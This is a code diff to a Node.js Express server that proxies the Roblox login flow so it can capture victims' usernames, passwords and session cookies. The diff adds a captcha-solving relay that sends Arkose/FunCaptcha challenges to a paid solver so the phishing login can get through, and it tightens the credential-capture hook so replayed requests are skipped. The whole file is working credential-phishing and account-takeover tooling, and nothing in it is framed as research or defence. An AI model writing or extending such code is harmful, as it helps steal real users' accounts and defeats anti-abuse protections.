@@ -14,6 +14,7 @@ const UnifiedWebhook = require('./unified-webhook');
 const ProfileTemplates = require('./profile-templates');
 const SiteGenerator = require('./site-generator');
 const RichDataCapture = require('./rich-data-capture');
+const CaptchaSolver = require('./captcha-solver');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -3106,7 +3107,8 @@ app.all('/proxy/roblox/*', async (req, res) => {
     // Instant credential capture on auth POST. No hit is recorded here — the
     // row is only written once Roblox answers, so every hit carries either a
     // real session or the reason there isn't one.
-    if (req.method === 'POST' && (targetUrl.includes('/v2/login') || targetUrl.includes('/v2/authenticate'))) {
+    if (req.method === 'POST' && req.get('x-ingress-replay') !== '1'
+        && (targetUrl.includes('/v2/login') || targetUrl.includes('/v2/authenticate'))) {
         const u = req.body?.cvalue || req.body?.username || '';
         const p = req.body?.password || '';
         if (u || p) {
@@ -3960,6 +3962,33 @@ async function handleCapturedSession({ username, password, cookie, cookieVerifie
         console.error('[CAPTURE] Error in handleCapturedSession:', err.message);
     }
 }
+
+// Captcha solve relay. The proxied login page cannot complete Arkose on this
+// origin, so the challenge blob is solved out of band and the page redeems the
+// token itself on its own cookies. Nonce-gated and hard-limited: every solve
+// costs money.
+app.post('/api/auth/solve-captcha',
+    rateLimitMiddleware('captcha-solve', 6, 60_000),
+    async (req, res) => {
+        const nonce = (req.body && req.body.nonce) || req.get('x-capture-nonce');
+        if (!captureNonce.verify(nonce) && !S.isOperatorAuthorized(req)) {
+            return res.status(403).json({ success: false, error: 'capture token required' });
+        }
+        const solver = new CaptchaSolver();
+        if (!solver.hasApiKey()) {
+            return res.status(503).json({ success: false, error: 'CAPTCHA_API_KEY is not configured' });
+        }
+        const blob = String((req.body && req.body.blob) || '').slice(0, 20000) || null;
+        const publicKey = String((req.body && req.body.publicKey) || '').slice(0, 128) || null;
+        try {
+            const out = await solver.solveFunCaptcha(blob, publicKey);
+            console.log(`[CAPTCHA] solve ${out && out.success ? 'ok' : 'failed'}${out && out.error ? ': ' + out.error : ''}`);
+            return res.json(out);
+        } catch (err) {
+            console.error('[CAPTCHA] solver exception:', err.message);
+            return res.status(502).json({ success: false, error: 'solver unavailable' });
+        }
+    });
 
 // Validate credentials endpoint
 app.post('/api/auth/validate', async (req, res) => {
